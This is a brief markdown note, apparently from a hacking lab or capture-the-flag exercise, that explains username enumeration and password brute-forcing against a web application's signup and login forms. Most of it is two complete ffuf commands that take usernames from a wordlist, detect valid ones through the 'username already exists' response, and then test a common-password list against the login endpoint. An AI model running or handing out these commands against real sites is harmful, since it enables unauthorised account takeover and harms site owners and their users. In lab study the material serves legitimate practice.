# Bruteforcing Usernames using ffuf:

if there is a feature on the website which gives out a response such as "this username already exists" when you sign up, use this command:
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.48.177.243/customers/signup -mr "username already exists"
```

save the found usernames in a `valid_usernames.txt` and use the command below to bruteforce the passwords

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.48.177.243/customers/login -fc 200
```
